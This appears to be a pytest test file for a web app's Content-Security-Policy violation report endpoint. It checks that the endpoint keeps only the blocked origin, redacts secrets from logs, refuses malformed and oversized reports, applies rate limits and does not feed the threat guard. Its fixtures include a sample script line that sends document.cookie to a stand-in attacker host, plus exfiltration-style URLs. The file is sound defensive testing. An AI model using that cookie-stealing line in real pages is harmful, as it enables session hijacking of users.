"""[Gate S10] ブラウザからの CSP 違反の報告(数えるだけ・値を残さない・偽の報告で害を出さない)。"""
import json
import logging

import pytest

from app.api.v1 import security_reports as sr
from app.core.config import settings
from app.ops import metrics as ops_metrics
from app.services import threat_guard as guard

URL = "/api/v1/security/csp-report"
LEGACY = {"csp-report": {
    "document-uri": "https://app.example/s/secret-share-token?x=1",
    "violated-directive": "script-src-elem",
    "effective-directive": "script-src-elem",
    "blocked-uri": "https://evil.example:8443/steal.js?token=abc#frag",
    "script-sample": "fetch('https://evil.example/'+document.cookie)",
}}
MODERN = [
    {"type": "csp-violation", "url": "https://app.example/planner", "body": {
        "effectiveDirective": "connect-src", "blockedURL": "https://exfil.example/c?d=secret",
        "documentURL": "https://app.example/planner"}},
    {"type": "deprecation", "body": {"id": "x"}},
]


def _post(client, payload, content_type="application/csp-report", **headers):
    return client.post(URL, content=json.dumps(payload), headers={"Content-Type": content_type, **headers})


def test_origin_only_is_kept():
    assert sr.blocked_origin("https://evil.example:8443/steal.js?token=abc") == "https://evil.example:8443"
    assert sr.blocked_origin("inline") == "inline"
    assert sr.blocked_origin("eval") == "eval"
    assert sr.blocked_origin("data:text/javascript,alert(1)") == "data"
    assert sr.blocked_origin("chrome-extension://abcdef/x.js") == "chrome-extension:"
    assert sr.blocked_origin("") == "unknown"
    assert sr.blocked_origin(42) == "unknown"


def test_legacy_report_is_counted_without_values(client, caplog):
    before = ops_metrics.registry.security_event_count("csp_violation")
    before_dir = ops_metrics.registry.security_event_count("csp_script_src_elem")
    with caplog.at_level(logging.WARNING, logger="app.api.v1.security_reports"):
        res = _post(client, LEGACY)
    assert res.status_code == 204
    assert ops_metrics.registry.security_event_count("csp_violation") == before + 1
    assert ops_metrics.registry.security_event_count("csp_script_src_elem") == before_dir + 1
    logged = caplog.text
    assert "https://evil.example:8443" in logged
    for secret in ("token=abc", "secret-share-token", "document.cookie", "steal.js"):
        assert secret not in logged


def test_reporting_api_format_is_counted(client):
    before = ops_metrics.registry.security_event_count("csp_connect_src")
    res = _post(client, MODERN, content_type="application/reports+json")
    assert res.status_code == 204
    assert ops_metrics.registry.security_event_count("csp_connect_src") == before + 1


def test_unknown_directives_do_not_add_new_metric_kinds(client):
    payload = {"csp-report": {"effective-directive": "made-up-directive-1", "blocked-uri": "inline"}}
    before = ops_metrics.registry.security_event_count("csp_other")
    assert _post(client, payload).status_code == 204
    assert ops_metrics.registry.security_event_count("csp_other") == before + 1
    assert ops_metrics.registry.security_event_count("csp_made_up_directive_1") == 0


@pytest.mark.parametrize("body", [b"not json", b"{}", b"[]", json.dumps({"csp-report": "x"}).encode()])
def test_malformed_reports_are_refused(client, body):
    res = client.post(URL, content=body, headers={"Content-Type": "application/csp-report"})
    assert res.status_code == 400


def test_large_reports_are_refused(client):
    big = {"csp-report": {"effective-directive": "img-src", "blocked-uri": "https://x.example/" + "a" * 20000}}
    assert _post(client, big).status_code == 413


def test_reports_are_rate_limited(client, monkeypatch):
    monkeypatch.setattr(settings, "RATE_LIMIT_CSP_REPORT", 3)
    statuses = [_post(client, LEGACY).status_code for _ in range(5)]
    assert statuses == [204, 204, 204, 429, 429]


def test_reports_never_feed_the_threat_guard(client, monkeypatch):
    """だれでも送れる報告で、他人(や自分の正規の画面)を遮断させない。"""
    monkeypatch.setattr(settings, "GUARD_ENABLED", True)
    for _ in range(10):
        _post(client, LEGACY)
    assert guard.current_score("testclient") == 0


def test_no_authentication_needed_and_cors_allows_the_app(client):
    origin = settings.CORS_ORIGINS[0] if isinstance(settings.CORS_ORIGINS, list) else settings.CORS_ORIGINS
    res = _post(client, LEGACY, Origin=origin)
    assert res.status_code == 204
    assert res.headers.get("access-control-allow-origin") == origin


def test_monitor_warns_on_csp_spikes():
    from app.ops import opslib

    prev = {"csp_violations_total": 5}
    assert "csp_violations" not in {f["code"] for f in opslib.evaluate_monitor({"csp_violations_total": 10}, prev)}
    found = {f["code"]: f for f in opslib.evaluate_monitor({"csp_violations_total": 40}, prev)}
    assert found["csp_violations"]["level"] == "warning"
